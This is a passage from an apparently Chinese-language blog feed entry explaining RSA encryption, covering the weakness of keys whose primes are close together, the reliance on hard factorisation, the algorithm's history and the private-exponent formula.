class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span></span></span></span></span></p><p>那么大数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>就可以被表示为</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>N</mi><mo>=</mo><mi>p</mi><mo>×</mo><mi>q</mi><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>a</mi><mn>2</mn></msup><mo>−</mo><msup><mi>b</mi><mn>2</mn></msup><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">N=p\times q=(a+b)(a-b)=a^2-b^2.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord">.</span></span></span></span></span></p><p>由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>很小，所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">a</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>N</mi></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{N}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.11333499999999996em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9266650000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-2.886665em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.11333499999999996em;"><span></span></span></span></span></span></span></span></span>的值非常接近，于是我们可以轻易倒推出用于产生密钥的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>的值。这种情况下，RSA的安全性很低。但好在幸运的是，应用中不会产生这样的错误，所以RSA依然是很可靠的加密方式。</p><h1 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h1><p>  从对于RSA彻底的分析来看，密码学在本质上是数学的实际应用。笔者在理解RSA密码加密的学习过程中，其实更多的时候都在了解其基于的数学原理，而并非大多数人所认为的加密过程。站在一个高度看RSA密码，其实其可靠性是由于<strong>人类对质因数分解掌握的不完全</strong>所保证的，因为知道公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(e,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>，从理论上是可以破解私钥的，只是<strong>实际不可行</strong>罢了。当然，我们也不能因此质疑RSA密码的可靠性，因为密码学对密码是否可用的标准一直只有两条：<strong>破解密码耗费的资源大于信息本身</strong>，或者<strong>破解密码需要的时间远大于信息的时效性</strong>，而并没有将牢不可破作为其中的标准。</p><p>  RSA密码在历史上首次是被政府发现的，然后其就一直作为机密被尘封起来。直到1977年，三位麻省理工的数学家独立发掘出这种公钥私钥计算方法，然后才成为了如今广泛使用的RSA加密算法。这个算法也由他们的名字命名：Ron <strong>R</strong>ivest,Adi <strong>S</strong>hamir,Leonard <strong>A</strong>dleman。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/06/03/n0TDc.webp" alt="公开RSA的三位数学家" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">公开RSA的三位数学家</span></div></div><p>  回过来看这个优美的表达式</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mo>=</mo><mfrac><mrow><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><mi>e</mi></mfrac><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">d=\dfrac{k\varphi(N)+1}{e},</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span></span></span></span></span></p><p><strong>一对看似无关的数字却连接着探索真相的答案，一个看似简单的算法却暗藏着千年未解的数学难题</strong>，这或许就是密码最终的魅力。</p>]]></content>
    
    
    <summary type="html">RSA，如今最广泛使用的公钥加密算法。数字签名、数字证书、SSH、HTTPS的加密链接全是它的典型应用。RSA背后隐藏着什么？</summary>
    
    
    
    <category term="安全" scheme="https://blog.snowflake.zone/categories/%E5%AE%89%E5%85%A8/"/>
    
    <category term="密码学" scheme="https://blog.snowflake.zone/categories/%E5%AE%89%E5%85%A8/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="密码学" scheme="https://blog.snowflake.zone/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
</feed>
